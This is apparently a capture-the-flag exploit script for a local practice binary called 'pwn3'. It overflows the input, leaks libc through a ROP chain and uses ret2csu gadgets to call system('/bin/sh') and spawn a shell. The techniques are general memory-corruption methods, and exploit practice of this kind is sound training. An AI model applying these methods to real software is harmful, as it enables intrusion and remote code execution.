#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
p = process('pwn3')
elf = ELF('pwn3')
#libc = ELF('libc.so.6')
libc = ELF('mylibc')

poprdi   = 0x004008b3
a2p6r    = 0x004008a6
p6r_gg   = 0x004008aa
m3c_gg   = 0x00400890
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_got = elf.got['read']
main     = 0x004007B4
read_ret = 0x0040080F
bss      = 0x00601070
stack    = bss + 0x200 + 0x10

raw_input("#################1#################")
# leak libc
payload1 = (
        "A"*8*3,
        p64(a2p6r),
        "B"*8*2,
        p64(stack),
        "B"*8*4,
        p64(poprdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main),
        )
payload1 = ''.join(payload1)

p.recvuntil('input : ')
# gdb.attach(p,"b *0x0400777")
p.sendline(payload1)

puts_libc   = libc.symbols['puts']
read_libc   = libc.symbols['read']
system_libc = libc.symbols['system']
puts        = u64(p.recvuntil('Give').split('\n')[0][-6:].ljust(8,'\x00'))
read        = puts - puts_libc + read_libc
system      = puts - puts_libc + system_libc
log.success("puts addr = "   + hex(puts))
log.success("read addr = "   + hex(read))
log.success("system addr = " + hex(system))

raw_input("#################2#################")
# write "/bin/sh" and system to bss
def rop(func=None, arg1=0, arg2=0, arg3=0):
    tmp = (
        p64(p6r_gg),
        p64(0),
        p64(1),
        p64(func),
        p64(arg3),
        p64(arg2),
        p64(arg1),
        p64(m3c_gg),
        "\x00"*8*2,
        p64(stack),
        "\x00"*8*4,
        )
    return ''.join(tmp)

payload2 = (
        "C"*8*3,
        p64(a2p6r),
        "D"*8*2,
        p64(stack),
        "D"*8*4,
        rop(read_got, 0, bss, 16),
        p64(poprdi),
        p64(bss+0x8),
        p64(system),
        p64(main),
        )
payload2 = ''.join(payload2)
p.recvuntil('input : ')
p.sendline(payload2)
sleep(1)
p.send( p64(system) + "/bin/sh\0")


p.interactive()
